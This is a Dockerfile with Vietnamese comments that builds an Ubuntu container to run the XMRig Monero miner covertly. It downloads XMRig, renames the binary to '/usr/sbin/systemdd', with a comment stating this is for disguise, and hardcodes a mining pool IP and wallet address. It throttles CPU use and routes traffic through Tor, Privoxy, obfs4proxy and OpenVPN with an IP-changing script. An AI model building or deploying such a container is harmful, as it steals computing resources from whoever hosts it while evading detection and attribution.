# Sử dụng image cơ bản từ Ubuntu 22.04.5 LTS
FROM ubuntu:22.04

# Cài đặt các công cụ cần thiết bao gồm Tor, Privoxy, OpenVPN và obfs4proxy
RUN apt-get update && apt-get install -y \
    torsocks \
    wget \
    tor \
    privoxy \
    openvpn \
    obfs4proxy \
    bc \
    rename \
    cpulimit \
    util-linux \
    && apt-get clean

# Thiết lập biến môi trường
ENV VERSION="6.21.0" \
    WORK_DIR="/root/work" \
    POOL="47.238.48.153:8080" \
    USERNAME="44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao" \
    ALGO="rx/0" \
    DONATE="1" \
    TOR_PORT="9051" \
    VPN_CONFIG="/etc/openvpn/client.ovpn" \
    CPU_MIN="50" \
    CPU_MAX="90"

# Tạo thư mục làm việc
RUN mkdir -p $WORK_DIR

# Tải và giải nén XMRig
RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz -P $WORK_DIR \
    && tar -xvzf $WORK_DIR/xmrig-${VERSION}-linux-x64.tar.gz -C $WORK_DIR \
    && mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/xmrig

# Di chuyển và đổi tên tệp thực thi để ngụy trang
RUN mv /root/work/xmrig /usr/sbin/systemdd

# Sao chép các file cấu hình vào container
COPY config /etc/privoxy/config
COPY torrc /etc/tor/torrc
COPY start.sh /root/start.sh
COPY change_ip.sh /root/change_ip.sh
COPY client.ovpn /etc/openvpn/client.ovpn

# Cấp quyền cho script và file cấu hình
RUN chmod +x /root/start.sh /root/change_ip.sh \
    && chmod 644 /etc/tor/torrc /etc/privoxy/config /etc/openvpn/client.ovpn

# CMD để khởi động start.sh
CMD ["/root/start.sh"]
